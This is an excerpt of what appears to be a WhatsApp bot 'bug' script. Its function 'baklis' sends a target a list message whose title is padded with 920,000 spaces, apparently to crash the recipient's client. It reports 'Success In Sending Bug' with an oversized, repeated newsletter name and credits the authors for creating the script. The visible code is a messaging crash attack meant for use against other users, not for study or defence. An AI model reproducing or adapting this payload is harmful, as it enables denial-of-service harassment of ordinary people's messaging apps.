...
message: {
documentMessage: {
title: `🖥️༐✲ LaxzyMods𒑊 ${m.body || m.mtype}`,
...
"title": `🖥️༐✲ Laxzy 𒑊 ${m.body || m.mtype}`,
"description": `LaxzyMods`,
"currencyCode": "IDR",
...
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "AkmalModsBugCrash"+" ".repeat(920000),
...
╰❑
  ...
  *© Thanks To Arif offc for create this script*`
...
await VarelTzy.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `By AkmalMods`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
